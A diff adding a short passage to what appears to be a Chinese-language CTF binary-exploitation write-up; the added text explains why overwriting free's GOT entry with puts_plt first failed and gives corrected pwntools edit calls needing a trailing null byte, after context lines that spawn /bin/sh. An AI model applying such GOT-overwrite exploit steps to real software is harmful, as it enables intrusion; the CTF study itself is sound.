@@ -603,3 +603,23 @@ io.sendline("/bin/sh")
 io.interactive()
 ```
 
+这里之前尝试把free_got写成puts_plt没有成功
+
+```assembly
+edit(3, p64(free_got) + p64(puts_got))
+edit(0, p32(puts_plt))
+```
+
+原因是
+
+![]({{site.baseurl}}/img/2022-10-03-zero.jpg)
+
+应该写为
+
+```assembly
+edit(3, p64(free_got) + p64(puts_got))
+dbg()
+edit(0, p32(puts_plt)+'\x00')
+pause()
+```
+
